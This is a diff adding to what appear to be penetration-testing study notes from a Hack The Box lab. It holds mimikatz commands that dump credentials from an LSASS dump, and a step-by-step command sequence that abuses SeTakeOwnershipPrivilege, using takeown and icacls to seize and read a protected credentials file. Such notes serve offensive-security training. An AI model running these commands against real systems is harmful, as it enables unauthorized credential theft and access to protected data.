@@ -349,3 +349,28 @@ mimikatz # log
 mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonpasswords  (You can see NTLM hash)
 _________________________________________________________________________________________________________________________________________________________________________________________
+SeTakeOwnershipPrivilege privilege escalation
+---------------------------------------------
+Enable-Privilege.ps1 (this script enables all the service)
+
+>Import-Module .\Enable-Privilege.ps1
+>.\Enable-Privilege.ps1
+
+Choose the private target file
+
+1. check the ownership
+>Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+
+2.Take ownership of the file
+>takeown.exe /f 'C:\Department Shares\Private\IT\cred.txt'
+
+3.Confirm ownership changed
+>Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+
+Cannot read the file because of the ACL
+
+4.Modifying ACL
+>icacls.exe 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+
+5.Finally read the file
+>cat C:\Department Shares\Private\IT\cred.txt
